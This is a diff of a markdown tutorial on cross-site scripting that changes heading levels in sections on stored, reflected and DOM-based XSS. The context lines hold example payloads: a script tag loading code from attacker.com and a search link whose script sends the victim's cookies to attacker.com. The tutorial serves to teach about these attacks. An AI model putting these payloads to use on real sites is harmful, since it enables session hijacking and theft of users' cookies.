@@ -14,7 +14,7 @@ XSS relies on the targeted user to interact with URLs and to potentially allow a
 
 There are three main types of XSS. The first two differ in whether they are persistent or not.
 
-### Stored XSS
+## Stored XSS
 
 Stored XSS is where an attacker injects malicious content that is stored by the application and then served up to other victims who visit the site. An example of this is would be injecting script into the input of a comment feature on a site which then gets displayed to other users. The script can be crafted to steal cookies by using the code:
 
@@ -34,13 +34,12 @@ More sophisticated scripts can be included from external sources:
 <script src=http://attacker.com/xss.js></script>
 ```
 
-### Reflected XSS
+## Reflected XSS
 
 This is a non-persistent XSS attack where the target is tricked into clicking a link to a site that incorporates the malicious script. An example of this would be tricking a target to click on a search link:
 
 ```markup
 <a href=http://search.com/search?keyword=<script>window.location='http://attacker.com/?cookie=' + document.cookie</script>;>Click Here</a>
-
 ```
 
 The script would be executed when the search function prints the results:
@@ -52,7 +51,7 @@ Results: …
 
 Again the user needs to be tricked into clicking a link and ideally not noticing the results of that click.
 
-### DOM-based XSS
+## DOM-based XSS
 
 In DOM-based XSS, the attacker uses the existing scripts on a page to write malicious code to the page itself where it is then executed. All of this can happen on the client when the page's javaScript is executed bypassing any filtering or protection on the server itself.
 
